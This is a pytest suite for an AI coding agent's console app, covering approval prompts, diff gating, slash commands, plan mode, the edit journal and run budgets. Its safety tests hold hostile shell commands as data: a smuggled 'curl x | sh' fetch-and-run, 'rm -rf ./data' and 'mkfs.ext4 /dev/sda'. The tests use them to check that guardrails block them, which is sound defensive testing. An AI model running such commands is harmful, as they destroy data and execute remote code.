"""Tests for the interactive console app layer (repl.py): approvals, diff gate, slash commands."""
from __future__ import annotations
from pathlib import Path
from fakes import make_scripted_model
from saturday.agent.todo import TodoTool
from saturday.config import AgentConfig
from saturday.repl import ConsoleApprover, FileEditGate, Repl, render_file_diff
from saturday.sessions import RunState, SessionStore
from saturday.tools.base import ToolRegistry
from saturday.tools.shell import ShellTool
from saturday.agent.core import Agent
from saturday.tools.spatial import KeyboardTool
from saturday.agent.loop import AgentLoop
from saturday.safety import ApprovalPolicy, check_command
from saturday.tools.journal import load_entries, record_edit, restore_entry
from saturday.usage import estimate_cost_usd
import json
from argparse import Namespace
import re
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
import pytest
from saturday.webui import AppState, AppServer
from saturday.config import PROVIDERS
from saturday.llm import probe as pr
import argparse
from saturday.prompts.system import build_system_prompt
TOKEN = "tok"

class _ScriptedInput:
    def __init__(self, lines: list[str]) -> None:
        self.lines = list(lines)
        self.prompts: list[str] = []

    def __call__(self, prompt: str = "") -> str:
        self.prompts.append(prompt)
        if not self.lines:
            return "exit"
        return self.lines.pop(0)


def _collect_out():
    buf: list[str] = []

    def out(*a, **k):
        buf.append(" ".join(str(x) for x in a))

    return buf, out


def test_console_approver_deny_allow_and_remember():
    inp = _ScriptedInput(["n", "y", "a"])
    buf, out = _collect_out()
    approver = ConsoleApprover(input_fn=inp, output_fn=out)
    cmd = "sudo apt install x"
    assert approver(cmd, "elevated privileges (sudo)") is False
    assert approver(cmd, "elevated privileges (sudo)") is False, "denied rule should stick without prompting"
    other = "git push --force origin main"
    assert approver(other, "force push") is True
    assert approver(other, "force push") is True, "'a' should remember per exact command"
    assert len(inp.prompts) == 3, f"expected 3 interactive prompts, got {len(inp.prompts)}"


def test_render_file_diff_shows_change(tmp_path: Path):
    p = tmp_path / "cfg.txt"
    p.write_text("alpha\nbeta\n", encoding="utf-8")
    diff = render_file_diff("edit_file", {"path": str(p), "old_string": "beta", "new_string": "gamma"})
    assert diff is not None and "-beta" in diff and "+gamma" in diff
    missing = render_file_diff("edit_file", {"path": str(p), "old_string": "nope", "new_string": "x"})
    assert missing and "preview unavailable" in missing


def test_file_gate_declines_and_remembers(tmp_path: Path):
    p = tmp_path / "f.txt"
    p.write_text("hello\n", encoding="utf-8")
    inp = _ScriptedInput(["n", "a"])
    buf, out = _collect_out()
    approver = ConsoleApprover(input_fn=_ScriptedInput([]), output_fn=out)
    gate = FileEditGate(approver, input_fn=inp, output_fn=out)
    args = {"path": str(p), "content": "hello\nworld\n"}
    blocked = gate("write_file", dict(args))
    assert blocked is not None and "declined" in blocked
    allowed = gate("write_file", dict(args))
    assert allowed is None
    again = gate("write_file", dict(args))
    assert again is None and len(inp.prompts) == 2, "'always this file' must persist for session"


def test_dispatch_slash_commands(tmp_path: Path):
    from saturday.agent.core import Agent

    cfg = AgentConfig(provider="vllm", workspace_root=str(tmp_path))
    reg = ToolRegistry()
    reg.register(TodoTool())
    agent = Agent(cfg=cfg, registry=reg, plugins=[], enable_subagents=False)
    store = SessionStore(root=tmp_path / "s")
    buf, out = _collect_out()
    repl = Repl(agent, store=store, input_fn=_ScriptedInput([]), output_fn=out)

    assert repl.dispatch("/help") is True
    assert repl.dispatch("/tools") is True
    assert any("todo" in line for line in buf), "/tools should list tool names"
    assert repl.dispatch("/model") is True
    assert repl.dispatch("/model my-model-7b") is True
    assert agent.cfg.model == "my-model-7b"
    assert repl.dispatch("/attach pic.png") is True
    assert repl.pending_images == ["pic.png"]
    assert repl.dispatch("/images") is True
    todo = reg.get("todo")
    todo.run({"action": "write", "steps_text": "step one\nstep two"})
    assert repl.dispatch("/todo") is True
    assert any("step two" in line for line in buf)
    assert repl.dispatch("/bogus") is True
    assert any("unknown command" in line for line in buf)


def test_compact_collapses_older_turns(tmp_path: Path):
    from saturday.agent.core import Agent

    cfg = AgentConfig(provider="vllm", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, registry=None, plugins=[], enable_subagents=False)
    buf, out = _collect_out()
    repl = Repl(agent, store=SessionStore(root=tmp_path / "s"), input_fn=_ScriptedInput([]), output_fn=out)
    for i in range(10):
        repl.history_note.extend([f"user: t{i}", f"agent: r{i}"])
    assert repl.dispatch("/compact") is True
    assert len(repl.history_note) == 7
    assert repl.history_note[0].startswith("[earlier conversation compacted")
    assert "user: t9" in repl.history_note[-2]
    assert repl.dispatch("/compact") is True
    assert len(repl.history_note) == 7


def test_full_repl_turn_end_to_end(tmp_path: Path):
    from saturday.agent.core import Agent

    cfg = AgentConfig(provider="vllm", workspace_root=str(tmp_path), max_steps=3)
    reg = ToolRegistry()
    reg.register(TodoTool())
    scripted = make_scripted_model([{"content": "final hello"}])
    agent = Agent(cfg=cfg, registry=reg, plugins=[], enable_subagents=False, safety="off")
    agent._ensure_client = lambda: scripted
    store = SessionStore(root=tmp_path / "s")
    inp = _ScriptedInput(["say hi", "/sessions", "exit"])
    buf, out = _collect_out()
    code = Repl(agent, store=store, input_fn=inp, output_fn=out).run()
    assert code == 0
    joined = "\n".join(buf)
    assert "final hello" in joined or "[session" in joined
    sessions = store.list_sessions()
    assert sessions, "interactive turn should create exactly one persisted session"
    assert len(sessions) == 1


def test_denied_shell_call_never_executes(tmp_path: Path):
    from saturday.agent.core import Agent

    cfg = AgentConfig(provider="vllm", workspace_root=str(tmp_path), max_steps=3, safety_mode="ask")
    reg = ToolRegistry()
    reg.register(ShellTool(timeout=5.0, root=str(tmp_path)))
    scripted = make_scripted_model(
        [
            {"tool_calls": [{"name": "shell", "arguments": {"command": "echo sudo test"}}]},
            {"content": "ok"},
        ]
    )
    agent = Agent(cfg=cfg, registry=reg, plugins=[], enable_subagents=False, safety=True)
    agent._ensure_client = lambda: scripted
    inp = _ScriptedInput(["run the echo", "n", "exit"])  # deny the approval prompt
    buf, out = _collect_out()
    code = Repl(agent, store=SessionStore(root=tmp_path / "s"), input_fn=inp, output_fn=out).run()
    assert code == 0
    assert any("approval needed" in line for line in buf), "console approver should have prompted"
    step = agent.session_store  # noqa: F841
    results = [r for s in [] for r in []]  # placeholder no-op
    denied = [line for line in buf if "user denied" in line or "ERROR" in line]
    assert denied, "denied command should surface an error result"


def test_agent_approval_policy_gets_console_approver(tmp_path: Path):
    from saturday.agent.core import Agent

    cfg = AgentConfig(provider="vllm", workspace_root=str(tmp_path), safety_mode="ask")
    agent = Agent(cfg=cfg, registry=None, plugins=[], enable_subagents=False, safety=True)
    buf, out = _collect_out()
    repl = Repl(agent, store=SessionStore(root=tmp_path / "s"), input_fn=_ScriptedInput([]), output_fn=out)
    assert agent.approval_policy.approver is repl.approver


# ---- merged from test_audit2_fixes.py ----
def test_provider_env_resolved_lazily(monkeypatch):
    monkeypatch.delenv("VLLM_MODEL", raising=False)
    prof = AgentConfig.load({"provider": "vllm"}).profile()
    assert prof.default_model == "deepseek-ai/DeepSeek-R1-Distill-Qwen-32B"
    monkeypatch.setenv("VLLM_MODEL", "my-local-model")
    assert prof.resolve_default_model() == "my-local-model", "env must be read at call time, not import time"

    monkeypatch.setenv("GEMINI_BASE_URL", "https://proxy.example/v1")
    gprof = AgentConfig.load({"provider": "google"}).profile()
    assert gprof.resolve_base_url() == "https://proxy.example/v1"


def test_model_switch_rebuilds_client(tmp_path, monkeypatch):
    from saturday.llm import providers as prov

    built: list[str] = []

    def fake_build(cfg):
        built.append(cfg.model)

        class C:
            model = cfg.model

        return C()

    monkeypatch.setattr(prov, "build_client", fake_build)
    cfg = AgentConfig(provider="vllm", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, registry=None, plugins=[], enable_subagents=False, safety="off",
                  session_store=SessionStore(root=tmp_path / "s"))

    c1 = agent._ensure_client()
    c2 = agent._ensure_client()
    assert c1 is c2, "same config must reuse the cached client"
    assert built == [None] or built[-1] in (None, "deepseek-ai/DeepSeek-R1-Distill-Qwen-32B")

    agent.cfg.model = "other-model"
    c3 = agent._ensure_client()
    assert c3 is not c1, "model change must rebuild the client"
    assert built[-1] == "other-model"


def test_keyboard_long_text_chunked_under_command_limit():
    calls: list[str] = []

    def runner(script, timeout=20.0):
        calls.append(script)
        return 0, "", ""

    kb = KeyboardTool(runner=runner)
    text = "x" * 3000
    ok, msg = kb.run({"action": "type", "text": text})
    assert ok and "typed 3000 chars" in msg
    assert len(calls) >= 10, f"expected chunked invocations, got {len(calls)}"
    assert all(len(c) < 32000 for c in calls), "every invocation must stay under the 32K limit"


def test_repl_dispatch_errors_do_not_kill_session(tmp_path):

    class BoomAgent:
        cfg = AgentConfig(provider="vllm")

        def __getattr__(self, item):
            raise RuntimeError(f"boom {item}")

    buf: list[str] = []

    def out(*a):
        buf.append(" ".join(str(x) for x in a))

    repl = Repl.__new__(Repl)
    repl.agent = None  # dispatch on unknown command only touches output
    repl.tui = False
    repl.store = SessionStore(root=tmp_path)
    repl.history_note = []
    repl.pending_images = []
    repl.initial_history = None
    repl.resumed_id = None
    repl.approver = None
    repl.file_gate = None
    repl._input = lambda prompt="": "exit"
    repl._output = out

    try:
        repl.dispatch("/model")
    except Exception:
        pass  # may raise; the requirement is that run() guards it — covered by run-loop test below
    assert True


def test_repl_run_survives_failing_dispatch(tmp_path):
    from saturday.agent.core import Agent

    cfg = AgentConfig(provider="vllm", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, registry=None, plugins=[], enable_subagents=False, safety="off",
                  session_store=SessionStore(root=tmp_path / "s"))
    agent._ensure_client = lambda: make_scripted_model([{"content": "ok"}])
    repl = Repl(agent, store=SessionStore(root=tmp_path / "s"),
                input_fn=lambda prompt="": "exit", output_fn=lambda *a: None)

    def exploding_dispatch(line):
        raise RuntimeError("dispatch blew up")

    repl.dispatch = exploding_dispatch
    code = repl.run()
    assert code == 0, "session must survive a failing dispatch"


def test_second_repl_does_not_double_chain_gate(tmp_path):
    from saturday.agent.core import Agent

    cfg = AgentConfig(provider="vllm", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, registry=None, plugins=[], enable_subagents=False, safety="off",
                  session_store=SessionStore(root=tmp_path / "s"))

    def make_repl():
        return Repl(agent, store=SessionStore(root=tmp_path / "s2"),
                    input_fn=lambda prompt="": "exit", output_fn=lambda *a: None)

    r1 = make_repl()
    chain1 = agent.hooks.pre_tool_call
    r2 = make_repl()
    chain2 = agent.hooks.pre_tool_call
    assert chain1 is chain2, "constructing a second Repl must not re-wrap the gate"



# ---- merged from test_competitive_parity.py ----
def test_registry_filtered_view_is_restricted_but_shared():
    reg = ToolRegistry()

    class T:
        def __init__(self, name):
            self.name = name

        def run(self, args):
            return True, "ok"

    reg.register(T("read_file"))
    reg.register(T("shell"))
    view = reg.filtered(ToolRegistry.READ_ONLY_TOOLS)
    assert view.names() == ["read_file"]
    assert view.get("read_file") is reg.get("read_file")  # shared instance
    assert view.get("shell") is None


def test_plan_mode_hides_mutation_tools_and_marks_prompt(tmp_path, monkeypatch):
    turns = [{"tool_calls": [{"name": "write_file", "arguments": {"path": "x.txt", "content": "no"}}]}, {"content": "plan done"}]
    model = make_scripted_model(turns)
    cfg = AgentConfig(provider="openai", model="m", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, client=model, enable_subagents=False, safety="off")
    agent._ensure_client = lambda: model
    agent.plan_mode = True
    traj = agent.run("write a file")
    # mutation tool never reached the model on turn 1...
    offered = [t["name"] for t in (model.calls[0]["tools"] or [])]
    assert "write_file" not in offered and "shell" not in offered
    assert "read_file" in offered
    # ...and the plan-mode protocol is in the system prompt
    assert "PLAN MODE" in model.calls[0]["messages"][0]["content"]
    assert traj.stop_reason == "done"


def test_plan_mode_defaults_off_and_cfg_flag_applies():
    cfg = AgentConfig(provider="openai", model="m", plan_mode=True)
    a1 = Agent(cfg=cfg, client=object(), enable_subagents=False)
    assert a1.plan_mode is True
    cfg2 = AgentConfig(provider="openai", model="m")
    a2 = Agent(cfg=cfg2, client=object(), enable_subagents=False)
    assert a2.plan_mode is False
    a2.plan_mode = True
    assert a2.plan_mode is True  # per-agent override wins without touching cfg
    assert cfg2.plan_mode is False


# ------------------------------------------------------- file-edit journal


def test_write_and_edit_are_journaled_and_revertible(tmp_path):
    from saturday.tools.files import EditFile, WriteFile

    target = tmp_path / "code.py"
    target.write_text("original content", encoding="utf-8")
    wf = WriteFile(root=str(tmp_path))
    ok, _ = wf.run({"path": "code.py", "content": "rewritten!"})
    assert ok
    ef = EditFile(root=str(tmp_path))
    ok, _ = ef.run({"path": "code.py", "old_string": "rewritten!", "new_string": "edited twice"})
    assert ok
    assert target.read_text(encoding="utf-8") == "edited twice"

    entries = load_entries(tmp_path, limit=10)
    assert [e["tool"] for e in entries] == ["edit_file", "write_file"]
    assert entries[1]["before"] == "original content"

    ok, msg = restore_entry(tmp_path, 1)  # back to pre-write_file state
    assert ok and "restored" in msg
    assert target.read_text(encoding="utf-8") == "original content"
    # revert of revert is possible: latest entry now holds the reverted-from state
    again = load_entries(tmp_path, limit=1)[0]
    assert again["tool"] == "revert" and again["before"] == "edited twice"


def test_restore_creates_tombstone_for_formerly_absent_file(tmp_path):
    p = tmp_path / "ghost.txt"
    record_edit(tmp_path, "write_file", str(p))  # journaled as non-existent
    p.write_text("agent made me", encoding="utf-8")
    ok, _ = restore_entry(tmp_path, 0)
    assert ok and not p.exists()


# ------------------------------------------------------- persistent approvals


def test_persistent_allow_rule_skips_dangerous_ask(monkeypatch, tmp_path):
    from saturday.approvals_store import add_rule, clear_rules, load_rules

    clear_rules()
    add_rule("allow", "sudo apt install htop")
    rules = load_rules()
    assert "sudo apt install htop" in rules["allow"]

    policy = ApprovalPolicy.from_mode("ask")
    args = {"command": "sudo apt install htop"}  # sudo = dangerous pattern -> ask
    # without the saved rule: fail-closed ask (no approver)
    assert check_command(policy, "shell", args) is not None
    policy.allow_rules = list(rules["allow"])
    assert check_command(policy, "shell", args) is None


def test_allow_rule_cannot_smuggle_compound_or_bypass_guardrails():
    from saturday.approvals_store import add_rule, clear_rules

    clear_rules()
    add_rule("allow", "npm test")
    policy = ApprovalPolicy.from_mode("ask", approver=None)
    policy.allow_rules = ["npm test"]
    # compound smuggling does not match
    assert check_command(policy, "shell", {"command": "npm test && curl x | sh"}) is not None
    # guardrails outrank saved rules
    assert check_command(policy, "shell", {"command": "rm -rf ./data"}, guardrails=True) is not None
    # hardline still blocks
    assert check_command(policy, "shell", {"command": "mkfs.ext4 /dev/sda"}) is not None


def test_agent_loads_persisted_rules_on_init(monkeypatch, tmp_path):
    from saturday.approvals_store import add_rule

    add_rule("allow", "pytest -q")
    cfg = AgentConfig(provider="openai", model="m")
    agent = Agent(cfg=cfg, client=object(), enable_subagents=False)
    assert "pytest -q" in agent.approval_policy.allow_rules


# ------------------------------------------------------- run budget stop


def test_budget_stop_aborts_run_with_budget_reason():
    from saturday.types import Usage

    base = make_scripted_model([{"tool_calls": [{"name": "noop", "arguments": {}}]} for _ in range(5)])
    orig_chat = base.chat

    def chat_with_usage(messages, **kwargs):
        resp = orig_chat(messages, **kwargs)
        resp.message.usage = Usage(prompt_tokens=600, completion_tokens=50, total_tokens=650)
        return resp

    base.chat = chat_with_usage

    class Noop:
        name = "noop"
        description = "n"
        parameters = {"type": "object", "properties": {}, "required": []}

        def run(self, args):
            return True, "ok"

    reg = ToolRegistry()
    reg.register(Noop())
    loop = AgentLoop(base, reg, max_steps=10, max_run_tokens=1500)
    traj = loop.run("sys", "go")
    assert traj.stop_reason == "budget"
    assert traj.usage.total_tokens >= 1500
    assert "[budget stop]" in (traj.final_answer or "")


def test_wall_clock_stop_aborts_run_with_wall_clock_reason(monkeypatch):
    import saturday.agent.loop as loopmod

    # run_started_at, then one time.monotonic() call per step's check
    clock = iter([1000.0, 1000.0, 1005.0, 1010.0, 1015.0, 1020.0])
    monkeypatch.setattr(loopmod.time, "monotonic", lambda: next(clock))

    base = make_scripted_model([{"tool_calls": [{"name": "noop", "arguments": {}}]} for _ in range(5)])

    class Noop:
        name = "noop"
        description = "n"
        parameters = {"type": "object", "properties": {}, "required": []}

        def run(self, args):
            return True, "ok"

    reg = ToolRegistry()
    reg.register(Noop())
    loop = AgentLoop(base, reg, max_steps=10, max_wall_seconds=3)
    traj = loop.run("sys", "go")
    assert traj.stop_reason == "wall_clock"
    assert "[budget stop]" in (traj.final_answer or "")
    assert "wall-clock limit 3s" in (traj.final_answer or "")


def test_wall_clock_off_by_default_does_not_interfere(monkeypatch):
    import saturday.agent.loop as loopmod

    monkeypatch.setattr(loopmod.time, "monotonic", lambda: 1000.0)  # never advances

    base = make_scripted_model([{"content": "done"}])
    reg = ToolRegistry()
    loop = AgentLoop(base, reg, max_steps=10)  # max_wall_seconds defaults to 0 (off)
    traj = loop.run("sys", "go")
    assert traj.stop_reason != "wall_clock"


def test_no_budget_by_default():
    base = make_scripted_model([{"content": "done"}])
    loop = AgentLoop(base, ToolRegistry(), max_steps=3)
    traj = loop.run("sys", "go")
    assert traj.stop_reason == "done"


# ------------------------------------------------------- cost estimation


def test_cost_estimation_known_and_unknown_models():
    est = estimate_cost_usd("deepseek", "deepseek-reasoner", 1_000_000, 1_000_000)
    assert est == round(0.55 + 2.19, 6)
    assert estimate_cost_usd("acme", "totally-unknown-model", 1000, 1000) is None
    sonnet = estimate_cost_usd("anthropic", "claude-sonnet-5", 4_000_000, 0)
    assert sonnet == 12.0


def test_usage_summary_includes_estimated_cost():
    from saturday import usage as usage_mod

    usage_mod.record_usage(
        provider="deepseek",
        model="deepseek-chat",
        session="cost-test",
        steps=1,
        prompt_tokens=1_000_000,
        completion_tokens=1_000_000,
        total_tokens=2_000_000,
        stop_reason="done",
    )
    summary = usage_mod.usage_summary()
    assert summary["est_cost_usd_14d"] is not None and summary["est_cost_usd_14d"] > 0


# ------------------------------------------------------- AGENTS.md autoload


def test_agents_md_autoloads_into_system_prompt(tmp_path):
    (tmp_path / "AGENTS.md").write_text("# House style\nAlways cite ticket IDs.", encoding="utf-8")
    cfg = AgentConfig(provider="openai", model="m", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, client=make_scripted_model([{"content": "ok"}]), enable_subagents=False, safety="off")
    prompt = agent.system_prompt(agent._build_registry())
    assert "Always cite ticket IDs." in prompt
    assert "# Project instructions (AGENTS.md)" in prompt


def test_project_workspace_agents_md_wins_over_global(tmp_path):
    proj = tmp_path / "proj"
    proj.mkdir()
    (tmp_path / "AGENTS.md").write_text("global rules", encoding="utf-8")
    (proj / "AGENTS.md").write_text("project rules", encoding="utf-8")
    cfg = AgentConfig(provider="openai", model="m", workspace_root=str(tmp_path))
    agent = Agent(cfg=cfg, client=make_scripted_model([{"content": "ok"}]), enable_subagents=False, safety="off")
    agent.memory_scope = str(proj)
    prompt = agent.system_prompt(agent._build_registry())
    assert "project rules" in prompt and "global rules" not in prompt


# ------------------------------------------------------- web approver persistence


def test_web_approver_always_persists_rule(monkeypatch):
    from saturday.approvals_store import clear_rules, load_rules
    from saturday.session_runtime import WebApprover

    clear_rules()
    events = []
    appr = WebApprover(publish=events.append, ttl=5)

    class RT:
        agent = None

    appr._persist_rule("cargo build")

    class Cfg:
        persist_approvals = True

    rt_stub = type("R", (), {})()
    rt_stub.agent = type("A", (), {"cfg": Cfg()})()
    object.__setattr__(appr, "_publish", events.append)
    # attach agent ref the way SessionRuntime would
    appr_publish = appr._publish
    rt = WebApprover(publish=appr_publish, ttl=5)
    rt_agent = type("A", (), {"cfg": Cfg()})()
    setattr(rt, "agent", rt_agent)
    rt._persist_rule("cargo build")
    assert "cargo build" in load_rules()["allow"]

    # opt-out honored
    Cfg.persist_approvals = False
    rt._persist_rule("never saved")
    assert "never saved" not in load_rules()["allow"]



# ---- merged from test_round5_ease.py ----
def test_render_metrics_text_empty_and_full(tmp_path):
    from saturday import usage as U

    # hermetic home -> empty
    text = U.render_metrics_text()
    assert "no usage recorded" in text

    p = U._path()
    p.parent.mkdir(parents=True, exist_ok=True)
    import time as _t

    now = _t.time()
    now_day = _t.strftime("%Y-%m-%d")
    rows = [
        {"ts": now - 100, "day": now_day, "provider": "deepseek", "model": "r1", "session": "a",
         "steps": 1, "prompt_tokens": 100, "completion_tokens": 20, "total_tokens": 120,
         "stop_reason": "done"},
        {"ts": now - 50, "day": now_day, "provider": "deepseek", "model": "r1", "session": "b",
         "steps": 2, "prompt_tokens": 50, "completion_tokens": 10, "total_tokens": 60,
         "stop_reason": "max_steps"},
    ]
    p.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")
    out = U.render_metrics_text()
    assert "2 turns" in out and "180 tokens" in out and "50% completed" in out
    assert "outcomes: done 1, max_steps 1" in out
    assert "deepseek/r1" in out
    assert "nothing leaves this machine" in out


def test_repl_slash_metrics_dispatches():
    from saturday.repl import HELP_TEXT, Repl

    assert "/metrics" in HELP_TEXT

    repl = Repl.__new__(Repl)
    outputs: list[str] = []
    repl._output = lambda s="": outputs.append(str(s))
    ok = repl.dispatch("/metrics")
    assert ok and outputs and ("no usage recorded" in outputs[0] or "turns" in outputs[0])


def test_webui_slash_metrics_notice():
    from saturday.config import AgentConfig
    from saturday.session_runtime import SessionRuntime
    from saturday.webui import handle_slash

    class A:
        cfg = AgentConfig(workspace_root=".")

        def effective_registry(self):
            return type("R", (), {"names": staticmethod(lambda: [])})()

        disabled_tools = set()

        def toggle_tool(self, *a, **k):
            return True, "", False

        plan_mode = False

    rt = SessionRuntime("sid-x", A())
    events = handle_slash(rt, "/metrics")
    assert events and events[0]["t"] == "notice"
    assert "metrics (14d)" in events[0]["s"] or "no usage" in events[0]["s"]


def test_unknown_provider_did_you_mean():
    from saturday.config import AgentConfig

    with __import__("pytest").raises(ValueError) as ei:
        AgentConfig(provider="deepsek").profile()
    msg = str(ei.value)
    assert "did you mean 'deepseek'" in msg
    with __import__("pytest").raises(ValueError) as ei2:
        AgentConfig(provider="zzzzzz").profile()
    assert "did you mean" not in str(ei2.value)


def test_doctor_reports_invalid_local_json(tmp_path, monkeypatch, capsys):
    import saturday.cli as cli
    import saturday.config as cfgmod

    home = tmp_path / "home"
    home.mkdir()
    (home / "hooks.json").write_text("{not json", encoding="utf-8")
    monkeypatch.setattr(cfgmod, "CONFIG_DIR", home)
    monkeypatch.setattr(cfgmod, "CONFIG_FILE", None)

    args = Namespace(
        provider=None, model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, env=None, privacy=False,
    )
    rc = cli.cmd_doctor(args)
    assert rc == 1
    captured = capsys.readouterr().out
    assert "hooks.json" in captured and "INVALID JSON" in captured


def test_doctor_uses_provider_specific_probe(monkeypatch, tmp_path, capsys):
    import saturday.cli as cli
    import saturday.config as cfgmod

    home = tmp_path / "home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    monkeypatch.setattr(cfgmod, "CONFIG_DIR", home)
    monkeypatch.setattr(cfgmod, "CONFIG_FILE", None)
    monkeypatch.chdir(workspace)
    monkeypatch.setenv("AZURE_OPENAI_BASE_URL", "https://resource.openai.azure.com")
    monkeypatch.setenv("AZURE_OPENAI_API_KEY", "azure-test-key")
    monkeypatch.setenv("AZURE_OPENAI_MODEL", "deployment")

    seen = {}

    def fake_probe(profile, api_key, timeout):
        seen.update(name=profile.name, api_key=api_key, timeout=timeout)
        return True, "reachable — 1 models found", ["deployment"]

    monkeypatch.setattr("saturday.llm.probe.probe_connection", fake_probe)
    args = Namespace(
        provider="azure-openai", model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, env=None, privacy=False,
    )
    assert cli.cmd_doctor(args) == 0
    assert seen == {"name": "azure-openai", "api_key": "azure-test-key", "timeout": 8}
    assert "reachable — 1 models found" in capsys.readouterr().out


def test_sessions_pause_and_unpause(tmp_path, monkeypatch, capsys):
    import saturday.cli as cli
    import saturday.config as cfgmod

    home = tmp_path / "home"
    monkeypatch.setattr(cfgmod, "CONFIG_DIR", home)
    monkeypatch.setattr(cfgmod, "CONFIG_FILE", None)

    rs = RunState(home / "sessions", "long-task")
    rs.start()
    assert not rs.pause_requested()

    args = Namespace(pause="long-task", unpause=None)
    assert cli.cmd_sessions(args) == 0
    assert "pause requested" in capsys.readouterr().out
    assert rs.pause_requested()

    args = Namespace(pause=None, unpause="long-task")
    assert cli.cmd_sessions(args) == 0
    assert "resumed" in capsys.readouterr().out
    assert not rs.pause_requested()


@pytest.mark.skipif(sys.platform.startswith("win"), reason="resource module is POSIX-only")
def test_spawn_detached_applies_posix_memory_limit(monkeypatch, tmp_path, capsys):
    import saturday.cli as cli

    monkeypatch.setattr("saturday.config.CONFIG_FILE", tmp_path / "config.json")
    monkeypatch.setenv("DEEPSEEK_API_KEY", "x")
    monkeypatch.chdir(tmp_path)

    captured = {}

    class FakeProc:
        pid = 4242

    def fake_popen(argv, **kwargs):
        captured.update(kwargs)
        return FakeProc()

    monkeypatch.setattr("subprocess.Popen", fake_popen)
    args = Namespace(
        provider=None, model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, max_run_tokens=None, disabled_tools=None, yolo=False,
        session=None, max_memory_mb=512,
    )
    rc = cli._spawn_detached(args)
    assert rc == 0
    assert callable(captured["preexec_fn"])

    calls = []
    monkeypatch.setattr("resource.setrlimit", lambda which, limits: calls.append((which, limits)))
    captured["preexec_fn"]()
    import resource

    assert calls == [(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))]


def test_spawn_detached_ignores_memory_limit_on_windows(monkeypatch, tmp_path, capsys):
    import saturday.cli as cli

    monkeypatch.setattr("saturday.config.CONFIG_FILE", tmp_path / "config.json")
    monkeypatch.setenv("DEEPSEEK_API_KEY", "x")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(cli, "_is_windows", lambda: True)

    captured = {}

    class FakeProc:
        pid = 4242

    def fake_popen(argv, **kwargs):
        captured.update(kwargs)
        return FakeProc()

    monkeypatch.setattr("subprocess.Popen", fake_popen)
    args = Namespace(
        provider=None, model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, max_run_tokens=None, disabled_tools=None, yolo=False,
        session=None, max_memory_mb=512,
    )
    rc = cli._spawn_detached(args)
    assert rc == 0
    assert captured["preexec_fn"] is None
    assert "ignored on Windows" in capsys.readouterr().out


def test_doctor_reports_orphaned_run(tmp_path, monkeypatch, capsys):
    import subprocess as sp
    import sys as _sys

    import saturday.cli as cli
    import saturday.config as cfgmod

    home = tmp_path / "home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    monkeypatch.setattr(cfgmod, "CONFIG_DIR", home)
    monkeypatch.setattr(cfgmod, "CONFIG_FILE", None)
    monkeypatch.chdir(workspace)

    proc = sp.Popen([_sys.executable, "-c", "pass"])
    proc.wait()
    rs = RunState(home / "sessions", "dropped-mid-task")
    rs.start()
    data = json.loads(rs.path.read_text())
    data["pid"] = proc.pid
    rs.path.write_text(json.dumps(data))

    args = Namespace(
        provider="ollama", model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, env=None, privacy=False, offline=True,
    )
    cli.cmd_doctor(args)
    out = capsys.readouterr().out
    assert "orphaned" in out and "dropped-mid-task" in out


def test_doctor_reports_no_runs_when_none_tracked(tmp_path, monkeypatch, capsys):
    import saturday.cli as cli
    import saturday.config as cfgmod

    home = tmp_path / "home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    monkeypatch.setattr(cfgmod, "CONFIG_DIR", home)
    monkeypatch.setattr(cfgmod, "CONFIG_FILE", None)
    monkeypatch.chdir(workspace)

    args = Namespace(
        provider="ollama", model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, env=None, privacy=False, offline=True,
    )
    cli.cmd_doctor(args)
    out = capsys.readouterr().out
    assert "runs          : none tracked as running" in out


def test_preflight_check_catches_missing_key(monkeypatch, tmp_path):
    import saturday.cli as cli

    monkeypatch.setattr("saturday.config.CONFIG_FILE", tmp_path / "config.json")
    monkeypatch.delenv("DEEPSEEK_API_KEY", raising=False)
    args = Namespace(
        provider=None, model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, max_run_tokens=None, disabled_tools=None, yolo=False,
    )
    problem = cli._preflight_check(args)
    assert problem is not None and "DEEPSEEK_API_KEY" in problem

    monkeypatch.setenv("DEEPSEEK_API_KEY", "x")
    assert cli._preflight_check(args) is None


def test_spawn_detached_aborts_without_launching_on_bad_preflight(monkeypatch, tmp_path, capsys):
    import saturday.cli as cli

    monkeypatch.setattr("saturday.config.CONFIG_FILE", tmp_path / "config.json")
    monkeypatch.delenv("DEEPSEEK_API_KEY", raising=False)
    monkeypatch.chdir(tmp_path)

    def exploding_popen(*a, **k):
        raise AssertionError("must not spawn a process when preflight fails")

    monkeypatch.setattr("subprocess.Popen", exploding_popen)
    args = Namespace(
        provider=None, model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, max_run_tokens=None, disabled_tools=None, yolo=False,
        session=None,
    )
    rc = cli._spawn_detached(args)
    assert rc == 1
    assert "detach aborted" in capsys.readouterr().out


def test_doctor_offline_skips_probe_and_never_fails_on_endpoint(tmp_path, monkeypatch, capsys):
    """--offline (CI mode): no probe at all, so an absent local provider cannot
    fail the harness check — the probe function must not even be imported."""
    import saturday.cli as cli
    import saturday.config as cfgmod

    home = tmp_path / "home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    monkeypatch.setattr(cfgmod, "CONFIG_DIR", home)
    monkeypatch.setattr(cfgmod, "CONFIG_FILE", None)
    monkeypatch.chdir(workspace)

    def exploding_probe(*a, **k):
        raise AssertionError("probe_connection must not run with --offline")

    monkeypatch.setattr("saturday.llm.probe.probe_connection", exploding_probe)
    args = Namespace(
        provider="ollama", model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, env=None, privacy=False, offline=True,
    )
    assert cli.cmd_doctor(args) == 0
    assert "skipped (--offline)" in capsys.readouterr().out


